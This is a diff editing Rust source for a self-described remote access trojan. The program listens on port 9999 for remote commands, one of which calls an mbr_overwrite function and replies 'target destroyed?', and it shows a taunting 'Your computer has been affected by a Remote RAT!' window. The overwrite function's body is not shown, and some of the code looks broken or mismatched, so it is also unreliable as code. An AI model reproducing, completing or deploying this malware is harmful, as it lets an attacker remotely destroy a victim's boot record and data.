@@ -1,4 +1,4 @@
-// sample rust code i guess?
+// I don't realy know much about rust but here :>
 use tokio::net::{TcpListener, TcpStream};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use winapi::shared::minwindef::{DWORD, LPVOID};
@@ -8,7 +8,7 @@ use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_YESNO};
 #[tokio::main]
 async fn main() {
     let listener = TcpListener::bind("0.0.0.0:9999").await.unwrap();
-    println!("Listening on port 9999...");
+    println!("Listening on port 9999..."); // message not required
 
     while let Ok((stream, _)) = listener.accept().await {
         tokio::spawn(handle_client(stream));
@@ -28,9 +28,8 @@ async fn handle_client(mut stream: TcpStream) {
                     tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                 }
                 stream.write(b"loading...").await.unwrap();
-                // Call the MBR overwrite function here
-                mbr_overwrite();
-                stream.write(b"boom?").await.unwrap();
+                mbr_overwrite(); // Call the MBR overwrite function here
+                stream.write(b"target destroyed?").await.unwrap();
             }
             "exit" => {
                 stream.write(b"breaking").await.unwrap();
@@ -59,7 +58,7 @@ fn create_gui_window() {
     let mut window = tk::Window::new();
     window.set_title("WARNING (RAT)");
     window.set_geometry("300x200");
-    let label = tk::Label::new(&window, "Your computer has been affected by a RAT!");
+    let label = tk::Label::new(&window, "Your computer has been affected by a Remote RAT! Good luck lol <3");
     label.pack();
     window.mainloop();
 }
